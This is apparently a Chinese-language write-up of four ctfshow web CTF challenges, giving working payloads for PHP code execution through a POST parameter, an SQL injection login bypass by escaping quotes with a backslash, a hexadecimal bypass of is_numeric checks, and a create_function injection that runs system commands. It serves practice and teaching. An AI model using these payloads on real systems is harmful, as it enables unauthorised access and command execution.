## web680(disabled_func)

首先我输入了，`code=phpinfo();`

查看禁用了很多函数，

这里可以用蚁剑连上，但是什么也看不了

接着

查看一下当前目录

`code=var_dump(scandir('.'));`

发现

```
array(4) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(9) "index.php"
  [3]=>
  string(21) "secret_you_never_know"
}

post code to run!
```

直接访问secret_you_never_know就是flag

## web681(构造万能密码)

随便给一个字符，他会返回

```
select count(*) from ctfshow_users where username = '11' or nickname = '11'
```

我输入单引号，他会直接删掉

用斜线试试，将单引号转义

```
select count(*) from ctfshow_users where username = '11\' or nickname = '11\'
```

构造万能密码

输入`||1#\`

```
select count(*) from ctfshow_users where username = '||1#\' or nickname = '||1#\'
```

得到flag

## web683(16进制绕过)

```php
 <?php

   error_reporting(0);
   include "flag.php";
   if(isset($_GET['秀'])){
       if(!is_numeric($_GET['秀'])){
          die('必须是数字');
       }else if($_GET['秀'] < 60 * 60 * 24 * 30 * 2){
          die('你太短了');
       }else if($_GET['秀'] > 60 * 60 * 24 * 30 * 3){
           die('你太长了');
       }else{
           sleep((int)$_GET['秀']);
           echo $flag;
       }
       echo '<hr>';
   }
   highlight_file(__FILE__); 
```

16进制被int函数转成0

![image-20240317154752728](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240317154752728.png)

payload

```
秀=0x76A6FA
```

## web684(create_function)

```php
 <?php
$action = $_GET['action'] ?? '';
$arg = $_GET['arg'] ?? '';

if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
    show_source(__FILE__);
} else {
    $action('', $arg);
}
```

> ```php
> $result = $value1 ?? $value2;
> ```
>
> 在这个例子中，如果 `$value1` 不为 `null`，则 `$result` 将被赋值为 `$value1`，否则将被赋值为 `$value2`。

payload

```
?action=%5ccreate_function&arg=}system("cat /secret_you_never_know");//
```

%5c是转义符
